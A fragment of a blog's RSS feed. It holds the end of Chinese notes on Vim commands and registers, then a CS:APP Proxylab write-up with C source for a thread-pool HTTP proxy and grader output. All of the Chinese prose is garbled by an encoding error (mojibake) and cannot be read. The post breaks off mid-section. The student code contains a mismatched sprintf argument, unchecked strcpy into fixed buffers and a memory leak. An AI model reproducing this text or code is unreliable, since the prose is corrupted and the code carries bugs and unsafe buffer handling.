&lt;li&gt;&lt;code&gt;{lineno}&lt;/code&gt;: è¡Œå·&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt;: æœ€åä¸€è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;:å…‰æ ‡å½“å‰è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/{pattern}&lt;/code&gt;: ä¸‹ä¸€ä¸ª&lt;code&gt;pattern&lt;/code&gt;æ‰€åœ¨è¡Œ
addresså¯ä»¥åšåŠ å‡æ³•,å¦‚ &lt;code&gt;.+3&lt;/code&gt;è¡¨ç¤ºå…‰æ ‡å¾€ä¸‹ç¬¬3è¡Œ, &lt;code&gt;$-3&lt;/code&gt;è¡¨ç¤ºå€’æ•°ç¬¬4è¡Œ.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;: å½“å‰æ–‡ä»¶æ‰€æœ‰è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#39;&amp;lt;&lt;/code&gt; / &lt;code&gt;&amp;#39;&amp;gt;&lt;/code&gt;: Visualæ¨¡å¼ä¸­é€‰ä¸­çš„å¼€å¤´å’Œç»“å°¾&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;è¡Œçš„å¤åˆ¶/ç§»åŠ¨/ç²˜è´´&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:[range] copy {address}&lt;/code&gt;: æŠŠrangeä¸­çš„è¡Œå¤åˆ¶åˆ°addressåé¢&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] move {address}&lt;/code&gt;: æŠŠrangeä¸­çš„è¡Œç§»åŠ¨åˆ°addressåé¢&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[address] put [x]&lt;/code&gt;: æŠŠå¯„å­˜å™¨xä¸­çš„å†…å®¹ç²˜è´´åˆ°addressåé¢&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ‰¹é‡æ“ä½œ:normalå‘½ä»¤&lt;/h2&gt;
&lt;p&gt;æ ¼å¼: &lt;code&gt;:[range] normal {commands}&lt;/code&gt;
å«ä¹‰:å¯¹rangeä¸­æ‰€æœ‰è¡Œæ‰§è¡ŒNormal æ¨¡å¼ä¸‹çš„å‘½ä»¤commands
å°æŠ€å·§:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;rangeä¸º%,å¯ä»¥å¯¹æ‰€æœ‰è¡Œæ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] normal .&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] normal @{register}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ‰¹é‡æ“ä½œ:globalå‘½ä»¤&lt;/h2&gt;
&lt;p&gt;æ ¼å¼: &lt;code&gt;:[range] global/pattern/[excmd]&lt;/code&gt;
å«ä¹‰: å¯¹rangeä¸­åŒ…å«patternçš„æ‰€æœ‰è¡Œæ‰§è¡ŒCommandæ¨¡å¼ä¸‹çš„eå‘½ä»¤
&lt;code&gt;[excmd]&lt;/code&gt;:Exå‘½ä»¤,é»˜è®¤ä¸ºæ‰“å°(print)
&lt;code&gt;:[range] global/{pattern}/normal {commands}&lt;/code&gt;:
å¯¹rangeä¸­æ‰€æœ‰ç¬¦åˆptternçš„è¡Œ,æ‰§è¡ŒNormalæ¨¡å¼ä¸‹çš„å‘½ä»¤commands
ä¾‹å¦‚:&lt;code&gt;:% global/TODO/normal @x&lt;/code&gt; å³å¯¹æ‰€æœ‰TODOè¡Œæ‰§è¡Œå¯„å­˜å™¨xå½•åˆ¶çš„å®.&lt;/p&gt;
&lt;h2&gt;æ›¿æ¢å‘½ä»¤&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;:[range]s/{pattern}/{string}/[flags]&lt;/code&gt;
è®²patternæ›¿æ¢ä¸ºstring
flags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;g&lt;/code&gt;: æ›¿æ¢æ¯ä¸€è¡Œçš„æ‰€æœ‰åŒ¹é…&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i&lt;/code&gt;: å¿½è§†å¤§å°å†™&lt;/li&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt;: æ›¿æ¢å‰ç¡®è®¤&lt;/li&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt;: è®¡æ•°è€Œä¸æ˜¯æ›¿æ¢&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Visualæ¨¡å¼&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Normalæ¨¡å¼ä¸‹æŒ‰&lt;code&gt;v&lt;/code&gt;è¿›å…¥visual æ¨¡å¼&lt;/li&gt;
&lt;li&gt;ç”¨ç§»åŠ¨å‘½ä»¤é€‰æ‹©æ–‡æœ¬&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x/y&lt;/code&gt;: å‰ªåˆ‡/å¤åˆ¶æ–‡æœ¬,å›åˆ°Normalæ¨¡å¼ä¸‹&lt;code&gt;p&lt;/code&gt;ç²˜è´´&lt;/li&gt;
&lt;li&gt;Normalæ¨¡å¼ä¸‹æŒ‰&lt;code&gt;V&lt;/code&gt;è¿›å…¥visual line æ¨¡å¼,ä¸€æ¬¡é€‰ä¸­ä¸€è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Esc&amp;gt;&lt;/code&gt;: å›åˆ°Normalæ¨¡å¼&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å¯„å­˜å™¨ä¸å®&lt;/h1&gt;
&lt;h2&gt;å¯„å­˜å™¨&lt;/h2&gt;
&lt;p&gt;ä¸€ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªå¯„å­˜å™¨
ç‰¹æ®Šçš„å¯„å­˜å™¨:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;: é»˜è®¤å¯„å­˜å™¨&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;: å½“å‰æ–‡ä»¶å&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;: ä¸Šä¸€æ¬¡æ’å…¥çš„å†…å®¹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:&lt;/code&gt;: ä¸Šä¸€æ¬¡æ‰§è¡Œçš„å‘½ä»¤&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;: ç³»ç»Ÿå‰ªåˆ‡æ¿&lt;/li&gt;
&lt;li&gt;é€šè¿‡&lt;code&gt;:reg {register}&lt;/code&gt;æŸ¥çœ‹
æŒ‡å®šå¯„å­˜å™¨:
åœ¨å¤åˆ¶/åˆ é™¤/ç²˜è´´ç­‰æ“ä½œå‰åŠ ä¸Š &lt;code&gt;&amp;quot;{register}&lt;/code&gt;å¯ä»¥æŒ‡å®šå¯„å­˜å™¨
å¦‚&lt;code&gt;&amp;quot;+p&lt;/code&gt;å¤åˆ¶ç³»ç»Ÿå‰ªåˆ‡æ¿çš„å†…å®¹.
æƒ³è¦æŒä¹…ä¿å­˜çš„æ–‡æœ¬æ”¾å…¥æŒ‡å®šçš„å¯„å­˜å™¨,é¿å…è¢«è¦†ç›–.
å¯„å­˜å™¨å­—ç¬¦å¤§å†™:æ·»åŠ åˆ°åŸæ¥å†…å®¹çš„åé¢è€Œéè¦†ç›–&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;å®&lt;/h2&gt;
&lt;p&gt;å½•åˆ¶ä¸€ç³»åˆ—é”®ç›˜æ“ä½œ,å¹¶å…è®¸é‡æ”¾è¿™äº›æ“ä½œ.
æ“ä½œç³»åˆ—å­˜å‚¨åœ¨æŒ‡å®šçš„å¯„å­˜å™¨ä¸­&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;q{register}&lt;/code&gt;: å¼€å§‹å½•åˆ¶å®,å¹¶å­˜æ”¾åœ¨æŒ‡å®šå¯„å­˜å™¨ä¸­&lt;/li&gt;
&lt;li&gt;å½•åˆ¶è¿‡ç¨‹ä¸­,æŒ‰&lt;code&gt;q&lt;/code&gt;é€€å‡ºå½•åˆ¶&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@{register}&lt;/code&gt;: é‡æ”¾å¯„å­˜å™¨ä¸­çš„æ“ä½œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@&lt;/code&gt;: é‡æ”¾ä¸Šä¸€æ¬¡å®æ“ä½œ&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sun, 16 Feb 2025 16:00:00 GMT</pubDate></item><item><title>Proxylab</title><link>https://www.tankimzeg.top/blog/proxylab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/proxylab/</guid><description>Proxylab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/proxylab/&quot;&gt;https://www.tankimzeg.top/blog/proxylab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;å…¥æ‰‹å‡†å¤‡&lt;/h1&gt;
&lt;p&gt;åœ¨è¿™ä¸ªå®éªŒä¸­,æˆ‘å°†åŠ¨æ‰‹å†™ä¸€ä¸ªWebä»£ç†æœåŠ¡å™¨.å¯¹äºèº«å¤„ä¸­å›½å¤§é™†å¹¶ä¸”å­¦ä¹ è¿‡è®¡ç®—æœºç½‘ç»œçš„æˆ‘æ¥è¯´,ä»£ç†æœåŠ¡å™¨çš„åŸç†å¹¶ä¸å¤æ‚.
æœ¬å®éªŒåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®ç°é¡ºåºä»£ç†æœåŠ¡å™¨&lt;/li&gt;
&lt;li&gt;å¤„ç†å¹¶å‘è¯·æ±‚&lt;/li&gt;
&lt;li&gt;ç¼“å­˜Webé¡µé¢&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;./driver.shæ–‡ä»¶æä¾›äº†è‡ªåŠ¨æµ‹è¯•çš„åŠŸèƒ½,ä½†é¦–å…ˆè¦ç¡®ä¿å®‰è£…äº†ä¾èµ–å·¥å…·:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt upgrade 
sudo apt install net-tools
sudo apt install curl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;tinyæ–‡ä»¶å¤¹ä¸‹æ˜¯CS:APPè¯¾ç¨‹çš„ä¸€ä¸ªç®€å•WebæœåŠ¡å™¨ç¤ºä¾‹.åˆ©ç”¨å®ƒå¯ä»¥è¿›è¡Œç®€å•çš„è°ƒè¯•.
åœ¨15214ç«¯å£å¯åŠ¨tiny server:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./tiny 15214
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åä½¿ç”¨&lt;code&gt;telnet&lt;/code&gt;å·¥å…·å‘é€è¯·æ±‚:&lt;code&gt;telnet localhost 15214&lt;/code&gt;
&lt;code&gt;GET /home.html HTTP/1.0&lt;/code&gt;
èƒ½å¾—åˆ°å¦‚ä¸‹åå“:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250213164706.png&quot; alt=&quot;&quot;&gt;
Writeupæç¤ºæˆ‘,ä¸åº”è®©æœåŠ¡å™¨è½»æ˜“å´©æºƒ,æ‰€ä»¥æˆ‘æ³¨é‡Šæ‰csapp.hæ–‡ä»¶çš„&lt;code&gt;unix_error&lt;/code&gt;å‡½æ•°å£°æ˜,åœ¨proxy.cæ–‡ä»¶ä¸­é‡è½½ä¸ºstacticç±»å‹,è¿™ä¸ªå¥‡æ€å¦™æƒ³è§£å†³äº†è¿™ä¸ªé—®é¢˜.
Writeupè¿˜æåˆ°äº†:your proxy must ignore SIGPIPE signals and should deal gracefully with write operations that return EPIPE errors.
ä¸æ˜¯å¾ˆæ‡‚,æš‚æ—¶ä¸ç®¡.&lt;/p&gt;
&lt;h1&gt;Part I:å®ç°é¡ºåºWebä»£ç†æœåŠ¡å™¨&lt;/h1&gt;
&lt;p&gt;HTTPè¯·æ±‚æœ‰å¤šç§,æœ¬å®éªŒåªè¦æ±‚å¤„ç†GET HTTP/1.0è¯·æ±‚.
Writeupæåˆ°äº†,åœ¨æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥URLå¦‚ &lt;a href=&quot;http://www.cmu.edu/hub/index.html&quot;&gt;http://www.cmu.edu/hub/index.html&lt;/a&gt;
ä¼šå‘ä»£ç†æœåŠ¡å™¨å‘é€å¦‚ä¸‹è¯·æ±‚è¡Œ:
&lt;code&gt;GET  http://www.cmu.edu/hub/index.html HTTP/1.1&lt;/code&gt;
æˆ‘éœ€è¦è½¬æ¢æˆ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET  /hub/index.html HTTP/1.0
Host: www.cmu.edu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3
Connection: close
Proxy-Connection: close
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä»–è¯·æ±‚å¤´ä¸å˜.
æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨csapp.cå°è£…çš„I/Oå‡½æ•°,ç”±äºä¸ç†Ÿæ‚‰å‡æ…¢äº†ä¸€äº›é€Ÿåº¦.å¥½åœ¨ä¸éš¾ç†è§£.
å¯¹åŸå§‹URI çš„åˆ†å‰²å’Œè®¨è®ºæŒºçƒ¦çš„,æ²¡ç”¨ä¸Šæ­£åˆ™è¡¨è¾¾å¼.&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹ä¸»å‡½æ•°,æˆ‘å€Ÿé‰´äº†tinyæœåŠ¡å™¨çš„è®¾è®¡,å¯ä»¥çœ‹åˆ°éå¸¸ç®€æ´:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main(int argc, char **argv)
{
Â  Â  int listenfd, connfd;
Â  Â  char hostname[MAXLINE], port[MAXLINE];
Â  Â  socklen_t clientlen;
Â  Â  struct sockaddr_storage clientaddr;
Â  Â  if(argc!=2){
Â  Â  Â  Â  printf(&amp;quot;Usage: %s &amp;lt;port&amp;gt;\n&amp;quot;,argv[0]);
Â  Â  Â  Â  return 0;
Â  Â  }
Â  Â  listenfd = Open_listenfd(argv[1]);
Â  Â  while(1){
Â  Â  clientlen = sizeof(clientaddr);
Â  Â  connfd = Accept(listenfd, (SA *)&amp;amp;clientaddr, &amp;amp;clientlen);
Â  Â  Getnameinfo((SA *) &amp;amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, 0);
Â  Â  printf(&amp;quot;Accepted connection from (%s, %s)\n&amp;quot;, hostname, port);
Â  Â  proxy(connfd);
Â  Â  Close(connfd);
Â  Â  }
Â  Â  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;proxy&lt;/code&gt;å‡½æ•°ä¹Ÿå…·æœ‰è¾ƒå¥½å¯è¯»æ€§:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void proxy(int connfd){
Â  Â  char buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];
Â  Â  char serv_req[MAXLINE];
Â  Â  rio_t rio;
  
Â  Â  Rio_readinitb(&amp;amp;rio,connfd);
Â  Â  if(!Rio_readlineb(&amp;amp;rio,buf,MAXLINE)) return;
Â  Â  fprintf(stdout,&amp;quot;%s&amp;quot;,buf);
Â  Â  sscanf(buf,&amp;quot;%s %s %s&amp;quot;,method,uri,version);
Â  Â  if(strcasecmp(method,&amp;quot;GET&amp;quot;)){
Â  Â  Â  Â  unix_error(&amp;quot;Proxy server does not implement this method&amp;quot;);
Â  Â  Â  Â  return ;
Â  Â  }
Â  Â  URI *uri_data = (URI *)malloc(sizeof(URI));
Â  Â  parse_uri(uri_data,uri);
Â  Â  int serverfd = Open_clientfd(uri_data-&amp;gt;host,uri_data-&amp;gt;port);
Â  Â  sprintf(serv_req,&amp;quot;GET %s HTTP/1.0\r\nHost: %s\r\n&amp;quot;,uri_data-&amp;gt;path,version,uri_data-&amp;gt;host);;
Â  Â  printf(&amp;quot;%s\n&amp;quot;,serv_req);
Â  Â  Rio_writen(serverfd,serv_req,strlen(serv_req));
Â  Â  readDeal_hdrs(serverfd,&amp;amp;rio);
Â  Â  writeback_response(serverfd,connfd);
Â  Â  Close(serverfd);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;æµ‹è¯•ç»“æœ&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./driver
*** Basic ***
Starting tiny on 4663
Starting proxy on 27345
1: home.html
   Fetching ./tiny/home.html into ./.proxy using the proxy
   Fetching ./tiny/home.html into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
2: csapp.c
   Fetching ./tiny/csapp.c into ./.proxy using the proxy
   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
3: tiny.c
   Fetching ./tiny/tiny.c into ./.proxy using the proxy
   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
4: godzilla.jpg
   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy
   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
5: tiny
   Fetching ./tiny/tiny into ./.proxy using the proxy
   Fetching ./tiny/tiny into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
Killing tiny and proxy
basicScore: 40/40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡!&lt;/p&gt;
&lt;h1&gt;Part II:å¤„ç†å¹¶å‘è¯·æ±‚&lt;/h1&gt;
&lt;p&gt;æˆ‘å·²ç»ä½“éªŒè¿‡åŸºäºè¿›ç¨‹çš„å¹¶å‘äº†,è¿™æ¬¡,æˆ‘å†³å®šå®ç°çº¿ç¨‹æ± æŠ€æœ¯å®ç°å¹¶å‘.
å›é¡¾[[åŒæ­¥#ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜]],æˆ‘ä»¬éœ€è¦ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± .
æˆ‘åˆ›å»ºäº†sbuf.hå’Œsbuf.cæ–‡ä»¶,å¹¶ä¿®æ”¹Makefile.
æ²¡å­¦è¿‡CMake,ä½†æ˜¯ç…§çŒ«ç”»è™:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cmake&quot;&gt;sbuf.o: sbuf.c sbuf.h
Â  Â  $(CC) $(CFLAGS) -c sbuf.c
  
proxy: proxy.o csapp.o sbuf.o
Â  Â  $(CC) $(CFLAGS) proxy.o csapp.o sbuf.o -o proxy $(LDFLAGS)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶å,æŸ¥çœ‹CS:APPè¯¾æœ¬(å¥½åƒæ˜¯690å¤šé¡µ)çš„ä»£ç ,ç¨ä½œä¿®æ”¹,éå¸¸è½»æ¾å°±å®ç°äº†çº¿ç¨‹æ± å¹¶å‘.&lt;/p&gt;
&lt;h2&gt;ç•™ä¸€ä»½å®Œæ•´ä»£ç :&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/CS-APP/blob/main/labs/proxylab/proxy.c&quot;&gt;proxy.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#includeÂ &amp;lt;stdio.h&amp;gt;  
#includeÂ &amp;quot;csapp.h&amp;quot;  
#includeÂ &amp;quot;sbuf.h&amp;quot;  
/*Â RecommendedÂ maxÂ cacheÂ andÂ objectÂ sizesÂ */  
#defineÂ MAX_CACHE_SIZEÂ 1049000  
#defineÂ MAX_OBJECT_SIZEÂ 102400  
  
typedefÂ structÂ {  
Â Â Â Â charÂ host[MAXLINE];  
Â Â Â Â charÂ port[MAXLINE];  
Â Â Â Â charÂ path[MAXLINE];  
}URI;  
  
/*Â YouÂ won&amp;#39;tÂ loseÂ styleÂ pointsÂ forÂ includingÂ thisÂ longÂ lineÂ inÂ yourÂ codeÂ */  
staticÂ constÂ charÂ *user_agent_hdrÂ =Â &amp;quot;User-Agent:Â Mozilla/5.0Â (X11;Â LinuxÂ x86_64;Â rv:10.0.3)Â Gecko/20120305Â Firefox/10.0.3\r\n&amp;quot;;  
  
  
/*Â ReloadÂ unix_errorÂ functionÂ toÂ avoidÂ exitÂ */  
staticÂ voidÂ unix_error(charÂ *msg);  
  
/*Â shareÂ bufÂ */  
sbuf_tÂ sbuf;  
#defineÂ SBUFSIZEÂ 20Â Â Â Â //Â sbuf/çº¿ç¨‹æ± çš„å¤§å°  
#defineÂ NTHREADSÂ 4Â Â //Â 4ä¸ªçº¿ç¨‹  
  
  
/*Â theÂ proxyÂ serverÂ */  
intÂ parse_uri(URIÂ *rebuild_uri,charÂ raw_uri[MAXLINE]){  
Â Â Â Â charÂ *hostptrÂ =Â strstr(raw_uri,&amp;quot;://&amp;quot;);  
Â Â Â Â charÂ *pathptrÂ =Â NULL;  
Â Â Â Â charÂ *portptrÂ =Â NULL;  
Â Â Â Â if(!hostptr){//Â ä¸ä»¥Â http://Â å½¢å¼è¯·æ±‚  
Â Â Â Â Â Â Â Â rebuild_uri-&amp;gt;host[0]Â =Â 0;  
Â Â Â Â Â Â Â Â strcpy(rebuild_uri-&amp;gt;port,&amp;quot;80&amp;quot;);  
Â Â Â Â Â Â Â Â if(pathptrÂ =Â strstr(raw_uri,&amp;quot;/&amp;quot;))  
Â Â Â Â Â Â Â Â Â Â Â Â strcpy(rebuild_uri-&amp;gt;path,pathptr);  
Â Â Â Â Â Â Â Â returnÂ 1;  
Â Â Â Â }  
Â Â Â Â else{  
Â Â Â Â Â Â Â Â portptrÂ =Â strstr(hostptr+3,&amp;quot;:&amp;quot;);  
Â Â Â Â Â Â Â Â if(portptr){  
Â Â Â Â Â Â Â Â Â Â Â Â intÂ port;  
Â Â Â Â Â Â Â Â Â Â Â Â sscanf(portptr+1,&amp;quot;%d%s&amp;quot;,&amp;amp;port,rebuild_uri-&amp;gt;path);  
Â Â Â Â Â Â Â Â Â Â Â Â sprintf(rebuild_uri-&amp;gt;port,&amp;quot;%d&amp;quot;,port);  
Â Â Â Â Â Â Â Â Â Â Â Â *portptrÂ =Â 0;  
Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â else{  
Â Â Â Â Â Â Â Â Â Â Â Â pathptrÂ =Â strstr(hostptr+3,&amp;quot;/&amp;quot;);  
Â Â Â Â Â Â Â Â Â Â Â Â strcpy(rebuild_uri-&amp;gt;path,pathptr);  
Â Â Â Â Â Â Â Â Â Â Â Â *pathptrÂ =Â 0;  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â strcpy(rebuild_uri-&amp;gt;host,hostptr+3);  
Â Â Â Â }  
Â Â Â Â returnÂ 2;  
}  
voidÂ readDeal_hdrs(intÂ sendfd,rio_tÂ *rp){Â //Â å‘é€è¯·æ±‚å¤´  
Â Â Â Â charÂ buf[MAXLINE];  
Â Â Â Â sprintf(buf,&amp;quot;%sConnection:Â close\r\nProxy-Connection:Â close\r\n&amp;quot;,user_agent_hdr);  
Â Â Â Â Rio_writen(sendfd,buf,strlen(buf));  
Â Â Â Â /*Â ä¿ç•™å…¶ä»–å¤´éƒ¨ä¿¡æ¯Â */  
Â Â Â Â for(Rio_readlineb(rp,buf,MAXLINE);strcmp(buf,&amp;quot;\r\n&amp;quot;);Rio_readlineb(rp,buf,MAXLINE)){  
Â Â Â Â Â Â Â Â if(!strncmp(buf,&amp;quot;Host:&amp;quot;,5)Â ||Â !strncmp(buf,&amp;quot;Connection:&amp;quot;,11)Â ||  
Â Â Â Â Â Â Â Â Â Â Â Â !strncmp(buf,&amp;quot;User-Agent:&amp;quot;,11)Â ||Â !strncmp(buf,&amp;quot;Proxy-Connection:&amp;quot;,17))  
Â Â Â Â Â Â Â Â Â Â Â Â continue;  
Â Â Â Â Â Â Â Â else  
Â Â Â Â Â Â Â Â Â Â Â Â Rio_writen(sendfd,buf,strlen(buf));  
Â Â Â Â Â Â Â Â printf(&amp;quot;%s\n&amp;quot;,buf);  
Â Â Â Â }  
Â Â Â Â Rio_writen(sendfd,buf,strlen(buf));  
  
}  
voidÂ writeback_response(intÂ servfd,intÂ clientfd){  
Â Â Â Â rio_tÂ rio;  
Â Â Â Â intÂ n;  
Â Â Â Â charÂ buf[MAXLINE];  
Â Â Â Â Rio_readinitb(&amp;amp;rio,servfd);  
Â Â Â Â while(n=Rio_readlineb(&amp;amp;rio,buf,MAXLINE))  
Â Â Â Â Â Â Â Â Rio_writen(clientfd,buf,n);  
Â Â Â Â }  
voidÂ proxy(intÂ connfd){  
Â Â Â Â charÂ buf[MAXLINE],Â method[MAXLINE],Â uri[MAXLINE],Â version[MAXLINE];  
Â Â Â Â charÂ serv_req[MAXLINE];  
Â Â Â Â rio_tÂ rio;  
  
Â Â Â Â Rio_readinitb(&amp;amp;rio,connfd);  
Â Â Â Â if(!Rio_readlineb(&amp;amp;rio,buf,MAXLINE))Â return;  
Â Â Â Â fprintf(stdout,&amp;quot;%s&amp;quot;,buf);  
Â Â Â Â sscanf(buf,&amp;quot;%sÂ %sÂ %s&amp;quot;,method,uri,version);  
Â Â Â Â if(strcasecmp(method,&amp;quot;GET&amp;quot;)){  
Â Â Â Â Â Â Â Â unix_error(&amp;quot;ProxyÂ serverÂ doesÂ notÂ implementÂ thisÂ method&amp;quot;);  
Â Â Â Â Â Â Â Â returnÂ ;  
Â Â Â Â }  
Â Â Â Â URIÂ *uri_dataÂ =Â (URIÂ *)malloc(sizeof(URI));  
Â Â Â Â parse_uri(uri_data,uri);  
Â Â Â Â intÂ serverfdÂ =Â Open_clientfd(uri_data-&amp;gt;host,uri_data-&amp;gt;port);  
Â Â Â Â sprintf(serv_req,&amp;quot;GETÂ %sÂ HTTP/1.0\r\nHost:Â %s\r\n&amp;quot;,uri_data-&amp;gt;path,uri_data-&amp;gt;host);;  
Â Â Â Â printf(&amp;quot;%s\n&amp;quot;,serv_req);  
Â Â Â Â Rio_writen(serverfd,serv_req,strlen(serv_req));  
Â Â Â Â readDeal_hdrs(serverfd,&amp;amp;rio);  
Â Â Â Â writeback_response(serverfd,connfd);  
Â Â Â Â Close(serverfd);  
}  
/*Â threadÂ */  
voidÂ *thread(voidÂ *vargp){  
Â Â Â Â Pthread_detach(pthread_self());  
Â Â Â Â intÂ connfd;  
Â Â Â Â while(1){  
Â Â Â Â connfdÂ =Â sbuf_remove(&amp;amp;sbuf);  
Â Â Â Â proxy(connfd);  
Â Â Â Â Close(connfd);  
Â Â Â Â }  
}  
  
intÂ main(intÂ argc,Â charÂ **argv)  
{  
Â Â Â Â intÂ listenfd,Â connfd;  
Â Â Â Â charÂ hostname[MAXLINE],Â port[MAXLINE];  
Â Â Â Â socklen_tÂ clientlen;  
Â Â Â Â structÂ sockaddr_storageÂ clientaddr;  
Â Â Â Â pthread_tÂ tid;  
Â Â Â Â Â Â Â Â if(argc!=2){  
Â Â Â Â Â Â Â Â printf(&amp;quot;Usage:Â %sÂ &amp;lt;port&amp;gt;\n&amp;quot;,argv[0]);  
Â Â Â Â Â Â Â Â returnÂ 0;  
Â Â Â Â }  
Â Â Â Â listenfdÂ =Â Open_listenfd(argv[1]);  
Â Â Â Â sbuf_init(&amp;amp;sbuf,SBUFSIZE);  
  
Â Â Â Â for(intÂ i=0;i&amp;lt;NTHREADS;i++){Â //Â åˆ›å»ºå‡ ä¸ªå¹¶å‘çº¿ç¨‹  
Â Â Â Â Â Â Â Â Pthread_create(&amp;amp;tid,NULL,thread,NULL);  
Â Â Â Â }  
Â Â Â Â while(1){  
Â Â Â Â clientlenÂ =Â sizeof(clientaddr);  
Â Â Â Â connfdÂ =Â Accept(listenfd,Â (SAÂ *)&amp;amp;clientaddr,Â &amp;amp;clientlen);  
Â Â Â Â Getnameinfo((SAÂ *)Â &amp;amp;clientaddr,Â clientlen,Â hostname,Â MAXLINE, port,Â MAXLINE,Â 0);  
Â Â Â Â printf(&amp;quot;AcceptedÂ connectionÂ fromÂ (%s,Â %s)\n&amp;quot;,Â hostname,Â port);  
Â Â Â Â sbuf_insert(&amp;amp;sbuf,Â connfd);  
Â Â Â Â }  
Â Â Â Â returnÂ 0;  
}  

staticÂ voidÂ unix_error(charÂ *msg){  
Â Â Â Â fprintf(stderr,Â &amp;quot;%s\n&amp;quot;,msg);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;æµ‹è¯•ç»“æœ&lt;/h2&gt;
&lt;p&gt;åˆæ¬¡æµ‹è¯•,æŠ¥é”™:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;*** Concurrency ***
Starting tiny on port 30981
Starting proxy on port 15708
Starting the blocking NOP server on port 19519
Timeout waiting for the server to grab the port reserved for it
Terminated
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
